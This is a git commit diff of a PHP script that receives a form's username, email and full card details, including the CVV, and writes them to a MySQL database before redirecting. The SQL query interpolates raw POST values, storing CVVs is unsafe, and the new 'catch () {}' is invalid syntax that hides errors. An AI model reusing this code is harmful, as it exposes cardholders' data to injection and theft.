0e21e6063bc3781f2b28501266c453b5874d64c4
Speer07 <q.rellstab@gmail.com>
2025-03-08 19:16:53 +0100

    redirect

--- userdata_receive.php
+++ userdata_receive.php
@@ -1,29 +1,24 @@
-<html>
-    <body>
-        <?php 
-            $user = $_POST["user"];
-            $email = $_POST["email"];
-            $name = $_POST["name"];
-            $cnumber = $_POST["cnumber"];
-            $cvv = $_POST["cvv"];
-            $expirydate = $_POST["expirydate"];
-            
-            include("connection.php");
-            
-            mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
-
-            $sql = "INSERT INTO user (user_username, user_email, bank_cardholder, bank_cardnumber, bank_cvv, bank_expdate)
-              VALUES ('$user', '$email', '$name', '$cnumber', '$cvv', '$expirydate')";
-
-            try {
-                mysqli_query($conn, $sql);
-            } 
-            catch (mysqli_sql_exception $e) {
-                echo "Verbindung zum Server fehlgeschlagen!" . $e->getMessage();
-            }
-
-            mysqli_close($conn); 
-        ?>
+<?php 
+    $user = $_POST["user"];
+    $email = $_POST["email"];
+    $name = $_POST["name"];
+    $cnumber = $_POST["cnumber"];
+    $cvv = $_POST["cvv"];
+    $expirydate = $_POST["expirydate"];
     
-    </body>
-</html>
+    include("connection.php");
+    
+      mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
+
+      $sql = "INSERT INTO user (user_username, user_email, bank_cardholder, bank_cardnumber, bank_cvv, bank_expdate)
+        VALUES ('$user', '$email', '$name', '$cnumber', '$cvv', '$expirydate')";
+
+      try {
+          mysqli_query($conn, $sql);
+      } 
+      catch () {}
+
+    mysqli_close($conn); 
+    header("Location: examplepage.php");
+    die();
+?>
